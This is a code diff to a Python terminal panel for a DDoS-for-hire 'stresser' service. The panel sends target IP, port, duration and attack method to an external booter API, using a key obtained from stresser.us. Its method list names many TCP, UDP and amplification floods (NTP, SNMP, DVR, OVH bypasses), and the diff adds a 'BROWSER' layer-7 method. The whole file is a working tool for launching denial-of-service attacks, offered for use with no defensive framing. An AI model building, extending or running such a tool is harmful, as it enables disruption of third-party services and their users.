@@ -5,22 +5,20 @@ from sys import stdout
 from time import sleep
 from sty import fg
 
-_USERNAME="larina"
-_KEY="YOUR_KEY_HERE"
+_USERNAME="YOUR_NAME"
+_KEY="KEY_HERE" # key from here >> https://stresser.us/
 _DALAY=0.5 # wait delay per req
-_METHODS=["TCPRAW","TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","OVHUDP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","TLSV1","TLSV2","UDPBYPASS"]
+_METHODS=["TCPRAW","TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","OVHUDP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","TLSV1","TLSV2","BROWSER","UDPBYPASS"]
 
 __builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
 clearconsole = lambda:system("cls || clear")
 exit=lambda: _exit(0)
 
-class COLOR:
-    def __init__(self)->None: # https://i.stack.imgur.com/S8wtO.png
-        self.text   = 15
-        self.invite = 82
-        self.logo   = 117
-        self.line   = 225
-_COLOR=COLOR()
+class _COLOR():# https://i.stack.imgur.com/S8wtO.png
+    text   = 15
+    invite = 82
+    logo   = 117
+    line   = 225
 
 def makec(text,color):
     return f"{fg(color)}{text}{fg.rs}"
@@ -56,7 +54,7 @@ def isgoodint(p,max)->bool:
 def request(ip,port,time,conn,method):
     for _ in range(int(conn)):
         try:
-            resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}").json()
+            resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}",timeout=15).json()
             print(makec(resp["data"],46 if resp["error"] != "yes" else 9))
         except Exception as e:
             try:
@@ -76,7 +74,7 @@ def helpcom():
 \t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP, OVHTCP, OVHUDP",_COLOR.text)}           {makec("║",_COLOR.line)}
 \t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> SNMP, WSD, DVR, NTP, ARD",_COLOR.text)}                       {makec("║",_COLOR.line)}
 \t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IGMP, GRE, ESP, IPRAND",_COLOR.text)}                         {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> TLSv1, TLSv2",_COLOR.text)}                                   {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> TLSv1, TLSv2, BROWSER",_COLOR.text)}                          {makec("║",_COLOR.line)}
 \t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPBYPASS",_COLOR.text)}                                      {makec("║",_COLOR.line)}
 \t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")
 
@@ -98,7 +96,7 @@ def main():
         commands=rawcommands[0].upper()
         args=rawcommands[1:]
         if commands in _METHODS:
-            if len(args) < 3 or not (commands.startswith("TLS") or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10)):
+            if len(args) < 3 or not ((commands.startswith("TLS") or commands.startswith("BROWSER")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10)):
                 print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
             else: request(args[0],args[1],args[2],args[3],commands)
         else:   
@@ -107,7 +105,7 @@ def main():
             except:print(makec("[!] command not found",11))
 
 if __name__ == "__main__":
-    commandslist={"EXIT":exit,"QUIT":exit,"HELP":helpcom,"CLEAR":clearcom}
+    commandslist={"EXIT":exit,"QUIT":exit,"HELP":helpcom,"CLEAR":helpcom} # clearcom
     system("CHCP 65001 || clear") # set utf 8
     system("mode 130,30 || clear")
     system("title stresser us panel private ^<3 || clear")
